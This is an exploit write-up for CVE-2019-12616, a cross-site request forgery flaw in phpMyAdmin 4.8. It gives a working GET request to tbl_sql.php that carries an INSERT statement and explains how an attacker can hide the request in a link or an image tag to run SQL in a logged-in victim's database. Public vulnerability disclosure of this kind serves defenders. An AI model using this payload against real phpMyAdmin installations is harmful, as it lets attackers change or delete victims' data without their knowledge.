# Date: 11 June 2019
# Exploit Author: Riemann
# Vendor Homepage: https://www.phpmyadmin.net/
# Software Link: https://www.phpmyadmin.net/downloads/
# Version: 4.8
# Tested on: UBUNTU 16.04 LTS -Installed Docker image - docker pull phpmyadmin/phpmyadmin:4.8
# CVE : 2019-12616

# Description
# An issue was discovered in phpMyAdmin before 4.9.0. A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) to the victim.


#VULNERABILITY:
The following request which is a form submission is done using the ¨GET¨ request instead of using ¨POST
<form method="get" action="index.php" class="disableAjax">

GET http://localhost:9000/tbl_sql.php?sql_query=INSERT+INTO+%60pma__bookmark%60+(%60id%60%2C+%60dbase%60%2C+%60user%60%2C+%60label%60%2C+%60query%60)+VALUES+(DAYOFWEEK(%27%27)%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27)&show_query=1&db=phpmyadmin&table=pma__bookmark HTTP/1.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0

Upgrade-Insecure-Requests: 1
Host: localhost:9000

The attacker can easily create a fake hyperlink containing the request that wants to execute on behalf the user,in this way making possible a CSRF attack due to the wrong use of HTTP method
